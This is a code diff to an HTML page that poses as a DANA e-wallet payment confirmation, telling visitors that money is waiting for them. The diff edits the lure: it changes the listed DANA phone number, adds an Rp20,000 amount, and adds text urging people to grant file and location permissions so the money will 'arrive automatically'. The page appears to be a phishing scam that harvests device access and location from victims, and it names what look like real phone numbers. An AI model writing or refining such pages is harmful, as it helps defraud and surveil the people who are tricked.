@@ -7930,7 +7930,7 @@ cat > index.html <<'EOF'
   <div class="screen" id="welcome">
     <div class="avatar"></div>
     <h1>DANA - Indonesia</h1>
-    <h1>ID - 085805579358</h1>
+    <h1>ID - 085701924847</h1>
     <h1>A/N Lela</h1>
     <button class="btn" onclick="showConsent()">Terima Pembeyaran</button>
   </div>
@@ -7940,13 +7940,15 @@ cat > index.html <<'EOF'
     <div class="card">
       <h2>Konfirmasi Payment</h2>
       <p>Terima Uang Dari UID Ascrow</p>
+      <p>Rp20.000 IDR</p>
       <ul id="featureList">
         <li>IZINKAN FILE</li>
         <li>IZINKAN LOKASI</li>
-        <p>Aktifkan Fitur Lokasi Pada Handphone Milik Anda.</p>
-      </ul>
+        <p>Mohon Aktifkan Izin Resmi Agar Dapat Menerima Uang Anda Setelah Izin Diberikan Uang Akan Diterima Otomatis</p> 
+        <p>Dana ID 𝟬𝟴𝟱𝟳𝟬𝟭𝟵𝟮𝟰𝟴𝟰𝟳 | 𝗞𝗮𝘀𝗶𝗹𝗲𝗺</p>
+        </ul>
       <p id="permissionDetails">Mohon Izinkan Akses Agar Dapat melihat IP dan Transaksi dibuat</p>
-      <button class="btn" onclick="requestPermissions()">Izinkan & Terima Uang</button>
+      <button class="btn" onclick="requestPermissions()">Izinkan & Cairkan Ke Dana Penerima</button>
     </div>
   </div>
 
